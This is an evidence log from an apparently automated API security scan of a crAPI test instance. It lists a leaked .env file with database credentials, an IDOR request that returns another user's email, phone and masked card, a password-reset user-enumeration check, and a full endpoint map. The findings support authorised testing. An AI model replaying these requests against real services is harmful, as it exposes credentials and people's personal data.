# Evidence Log - recon-auth Discovery Worker
**Target:** http://crapi2.apisec.ai  
**Worker:** eng-mtad1l7b-discovery-r0z2  
**Date:** 2026-08-26

---

## 1. .env File Leak (HIGH)
```
GET http://crapi2.apisec.ai/.env → HTTP 200
DB_NAME=crapi, DB_USER=crapi, DB_PASSWORD=crapi, DB_HOST=postgresdb, DB_PORT=5432
MONGO_DB_HOST=mongodb, MONGO_DB_PORT=27017, MONGO_DB_USER=crapi, MONGO_DB_PASSWORD=crapi
```

## 2. IDOR/BOLA on Orders (CRITICAL)
```
GET /workshop/api/shop/orders/1 as user reconworker@test.com returns:
- email: muqeed+6@apisec.ai, phone: 778899663355
- payment: card_number XXXXXXXXXXXX3859, owner: Muqeed, MasterCard, expiry 08/2027
GET /workshop/api/shop/orders/2 → same victim data
```

## 3. User Enumeration (MEDIUM)
```
POST /identity/api/auth/forget-password {"email":"reconworker@test.com"} → OTP Sent (200)
POST /identity/api/auth/forget-password {"email":"nonexistent@test.com"} → "Given Email is not registered!" (404)
```

## 4. API Architecture
- Frontend: React SPA via OpenResty/1.27.1.2
- Backend: Spring Boot (Java)  
- DB: PostgreSQL (postgresdb:5432) + MongoDB (mongodb:27017)
- Auth: JWT RS256, role: user
- Prefixes: identity/(auth/user), workshop/(shop/mechanic), community/(social/coupon)

## 5. Complete API Endpoint Map
### identity/ prefix
- POST /identity/api/auth/signup (name, email, number, password)
- POST /identity/api/auth/login (email, password) → JWT
- POST /identity/api/auth/unlock (email)
- POST /identity/api/auth/forget-password (email) → OTP
- POST /identity/api/auth/verify (token)
- POST /identity/api/auth/v3/check-otp (email, otp)
- GET  /identity/api/auth/v4.0/user/login-with-token
- GET  /identity/api/v2/user/dashboard
- POST /identity/api/v2/user/change-email (old_email, new_email)
- POST /identity/api/v2/user/change-phone-number (old_number, new_number, otp)
- POST /identity/api/v2/user/reset-password (password)
- POST /identity/api/v2/user/verify-email-token (token)
- POST /identity/api/v2/user/verify-phone-otp (otp)
- GET  /identity/api/v2/user/pictures
- GET  /identity/api/v2/user/videos
- POST /identity/api/v2/user/videos/convert_video (video_name, video_url)
- POST /identity/api/v2/vehicle/add_vehicle
- GET  /identity/api/v2/vehicle/vehicles
- GET  /identity/api/v2/vehicle/{carId}/location

### workshop/ prefix
- GET  /workshop/api/shop/products?limit=30&offset=0
- POST /workshop/api/shop/orders (product_id, quantity)
- GET  /workshop/api/shop/orders/all?limit=30
- GET  /workshop/api/shop/orders/{orderId}
- POST /workshop/api/shop/return_order?order_id=X
- POST /workshop/api/shop/apply_coupon (coupon_code, amount)
- GET  /workshop/api/mechanic/service_requests
- POST /workshop/api/merchant/contact_mechanic

### community/ prefix
- GET  /community/api/v2/community/posts/recent
- POST /community/api/v2/community/posts (content)
- GET  /community/api/v2/community/posts/{postId}
- POST /community/api/v2/community/posts/{postId}/comment
- POST /community/api/v2/coupon/validate-coupon (coupon_code)
